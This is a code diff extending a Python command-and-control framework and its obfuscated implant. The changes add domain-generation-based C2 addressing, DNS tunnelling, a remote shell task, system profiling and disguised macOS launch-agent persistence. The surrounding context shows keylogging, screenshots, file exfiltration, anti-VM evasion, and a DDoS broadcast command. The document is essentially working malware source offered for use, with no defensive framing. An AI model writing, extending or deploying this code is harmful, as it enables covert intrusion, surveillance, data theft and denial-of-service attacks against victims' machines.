@@ -9,21 +9,26 @@ import hmac
 import hashlib
 from cryptography.fernet import Fernet
 from datetime import datetime
-import dnslib  # For DNS tunneling
+import dnslib
 from socket import socket, AF_INET, SOCK_DGRAM
 
 # Configuration
 C2_PORT = 8443
-DNS_PORT = 53  # For DNS tunneling
+DNS_PORT = 53
 CERT_FILE = "server.crt"
 KEY_FILE = "server.key"
 TASKS_DIR = "tasks"
 FILES_DIR = "files"
 SECRET_KEY = os.urandom(32)
+C2_DOMAIN = "c2.example.com"
 
 # Store active listeners, agents, and their keys
 listeners = {}
 agents = {}  # {agent_id: {"status": str, "tasks": list, "key": bytes}}
+
+def generate_domain(seed):
+    """Domain Generation Algorithm (DGA)"""
+    return hashlib.md5((seed + str(int(datetime.now().timestamp() // 86400))).encode()).hexdigest()[:10] + "." + C2_DOMAIN
 
 class C2Handler(http.server.BaseHTTPRequestHandler):
     def verify_hmac(self, data, received_hmac):
@@ -57,7 +62,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             return
 
-        data = json.loads(Fernet(agents.get(data["agent_id"], {}).get("key", SECRET_KEY)).decrypt(post_data).decode())
+        data = json.loads(Fernet(agents.get(data.get("agent_id", ""), {}).get("key", SECRET_KEY)).decrypt(post_data).decode())
         agent_id = data["agent_id"]
 
         if self.path == "/register":
@@ -112,20 +117,22 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
 def start_dns_listener():
     sock = socket(AF_INET, SOCK_DGRAM)
     sock.bind(("", DNS_PORT))
+    print(f"DNS listener started on port {DNS_PORT}")
     while True:
         data, addr = sock.recvfrom(1024)
         request = dnslib.DNSRecord.parse(data)
         domain = str(request.q.qname)
-        if domain.startswith("task."):
+        current_domain = generate_domain("c2seed")
+        if domain.startswith(f"task.") and current_domain in domain:
             agent_id = domain.split(".")[1]
             if agent_id in agents:
                 cipher = Fernet(agents[agent_id]["key"])
                 task = agents[agent_id]["tasks"].pop(0) if agents[agent_id]["tasks"] else None
                 response_data = cipher.encrypt(json.dumps({"task": task}).encode())
-                response = dnslib.DNSRecord.reply(request)
+                response = request.reply()
                 response.add_answer(dnslib.RR(domain, dnslib.QTYPE.TXT, rdata=dnslib.TXT(base64.b64encode(response_data))))
                 sock.sendto(response.pack(), addr)
-        elif domain.startswith("result."):
+        elif domain.startswith(f"result.") and current_domain in domain:
             agent_id = domain.split(".")[1]
             if agent_id in agents:
                 cipher = Fernet(agents[agent_id]["key"])
@@ -142,7 +149,7 @@ def start_listener(port):
     listener_thread = threading.Thread(target=server.serve_forever)
     listener_thread.start()
     listeners[port] = server
-    print(f"Listener started on port {port}")
+    print(f"HTTPS listener started on port {port}")
 
 def stop_listener(port):
     if port in listeners:
@@ -150,7 +157,7 @@ def stop_listener(port):
         del listeners[port]
         print(f"Listener stopped on port {port}")
 
-def generate_payload(agent_id, domain="c2.example.com"):
+def generate_payload(agent_id, domain=C2_DOMAIN):
     var_c2_url = f"v{os.urandom(4).hex()}"
     var_agent_id = f"a{os.urandom(4).hex()}"
     var_cipher = f"c{os.urandom(4).hex()}"
@@ -171,6 +178,7 @@ import hashlib
 import ctypes
 import dnslib
 from socket import socket, AF_INET, SOCK_DGRAM
+import psutil
 
 {var_agent_id} = "{agent_id}"
 C2_DOMAIN = "{domain}"
@@ -182,11 +190,16 @@ def compute_hmac(data):
 
 def is_vm():
     checks = [
-        ctypes.windll.kernel32.IsDebuggerPresent(),
+        ctypes.windll.kernel32.IsDebuggerPresent() if platform.system() == "Windows" else False,
         os.path.exists("/proc/xen"),
-        len(os.popen("wmic bios get serialnumber").read().strip()) < 5
+        len(os.popen("wmic bios get serialnumber" if platform.system() == "Windows" else "dmidecode -s system-serial-number").read().strip()) < 5,
+        os.path.exists("/Library/Application Support/VMware Tools") if platform.system() == "Darwin" else False
     ]
     return any(checks)
+
+def generate_domain(seed):
+    import hashlib
+    return hashlib.md5((seed + str(int(time.time() // 86400))).encode()).hexdigest()[:10] + "." + C2_DOMAIN
 
 def register():
     global {var_cipher}
@@ -195,7 +208,7 @@ def register():
     encrypted_data = {var_cipher}.encrypt(data)
     headers = {{"X-HMAC": compute_hmac(encrypted_data)}}
     try:
-        response = requests.post(f"https://{{C2_DOMAIN}}:{C2_PORT}/register", verify=False, data=encrypted_data, headers=headers)
+        response = requests.post(f"https://{{generate_domain('c2seed')}}:{C2_PORT}/register", verify=False, data=encrypted_data, headers=headers)
         response_hmac = response.headers.get("X-HMAC")
         if hmac.compare_digest(hmac.new(base64.b64decode(SECRET_KEY), response.content, hashlib.sha256).digest(), base64.b64decode(response_hmac)):
             data = json.loads({var_cipher}.decrypt(response.content).decode())
@@ -205,8 +218,8 @@ def register():
 
 def get_task_dns():
     sock = socket(AF_INET, SOCK_DGRAM)
-    request = dnslib.DNSRecord.question(f"task.{{var_agent_id}}.{{C2_DOMAIN}}", "TXT")
-    sock.sendto(request.pack(), ("8.8.8.8", 53))  # Use public DNS for testing
+    request = dnslib.DNSRecord.question(f"task.{{var_agent_id}}.{{generate_domain('c2seed')}}", "TXT")
+    sock.sendto(request.pack(), ("127.0.0.1", 53))
     data, _ = sock.recvfrom(1024)
     response = dnslib.DNSRecord.parse(data)
     for answer in response.rr:
@@ -217,8 +230,8 @@ def get_task_dns():
 def send_result_dns(result):
     sock = socket(AF_INET, SOCK_DGRAM)
     encrypted_result = {var_cipher}.encrypt(result.encode())
-    request = dnslib.DNSRecord.question(f"result.{{var_agent_id}}.{{base64.b64encode(encrypted_result).decode()}}.{{C2_DOMAIN}}", "TXT")
-    sock.sendto(request.pack(), ("8.8.8.8", 53))
+    request = dnslib.DNSRecord.question(f"result.{{var_agent_id}}.{{base64.b64encode(encrypted_result).decode()}}.{{generate_domain('c2seed')}}", "TXT")
+    sock.sendto(request.pack(), ("127.0.0.1", 53))
 
 def get_task():
     try:
@@ -238,7 +251,7 @@ def upload_file(file_path):
     data = json.dumps({{"agent_id": {var_agent_id}, "file_name": os.path.basename(file_path), "file_data": file_data}}).encode()
     encrypted_data = {var_cipher}.encrypt(data)
     headers = {{"X-HMAC": compute_hmac(encrypted_data)}}
-    requests.post(f"https://{{C2_DOMAIN}}:{C2_PORT}/upload", verify=False, data=encrypted_data, headers=headers)
+    requests.post(f"https://{{generate_domain('c2seed')}}:{C2_PORT}/upload", verify=False, data=encrypted_data, headers=headers)
 
 def take_screenshot():
     screenshot = ImageGrab.grab()
@@ -257,6 +270,21 @@ def keylogger(duration):
     listener.stop()
     return "".join(log)
 
+def remote_shell(commands):
+    results = []
+    for cmd in commands.split(";"):
+        results.append(subprocess.getoutput(cmd.strip()))
+    return "\\n".join(results)
+
+def system_info():
+    info = {
+        "os": platform.platform(),
+        "cpu": psutil.cpu_count(),
+        "memory": psutil.virtual_memory().total / (1024 ** 3),  # GB
+        "hostname": platform.node()
+    }
+    return json.dumps(info)
+
 def persist():
     if platform.system() == "Windows":
         subprocess.run(["schtasks", "/create", "/sc", "onlogon", "/tn", "SystemUpdater", "/tr", f"python {{os.path.abspath(__file__)}}", "/f"], capture_output=True)
@@ -265,10 +293,29 @@ def persist():
         with open("/tmp/cron", "w") as f:
             f.write(cron_job)
         subprocess.run(["crontab", "/tmp/cron"], capture_output=True)
+    elif platform.system() == "Darwin":
+        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.updater</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>python3</string>
+        <string>{os.path.abspath(__file__)}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>"""
+        with open(os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist"), "w") as f:
+            f.write(plist)
+        subprocess.run(["launchctl", "load", os.path.expanduser("~/Library/LaunchAgents/com.system.updater.plist")], capture_output=True)
 
 def main():
     if is_vm():
-        time.sleep(3600)  # Sleep if VM detected
+        time.sleep(3600)
         return
     persist()
     register()
@@ -301,12 +348,17 @@ def main():
                     t.start()
                 for t in threads:
                     t.join()
-        time.sleep(random.randint(30, 120))  # Randomized beacon interval
+            elif task_type == "shell":
+                result = remote_shell(task_data)
+                send_result(result)
+            elif task_type == "sysinfo":
+                result = system_info()
+                send_result(result)
+        time.sleep(random.randint(30, 120))
 
 if __name__ == "__main__":
     exec(__import__('base64').b64decode('{base64.b64encode('main()'.encode()).decode()}').decode())
 """
-    # Obfuscate with base64 and dynamic wrapping
     encoded_payload = base64.b64encode(payload.encode()).decode()
     wrapper = f"""
 import base64
@@ -341,4 +393,6 @@ if __name__ == "__main__":
     task_agent("agent_001", "screenshot", "")
     task_agent("agent_001", "keylog", "10")
     task_agent("agent_001", "upload", "test.txt")
+    task_agent("agent_001", "shell", "whoami;dir")
+    task_agent("agent_001", "sysinfo", "")
     broadcast_task("ddos", {"url": "http://target.com", "duration": "30"})
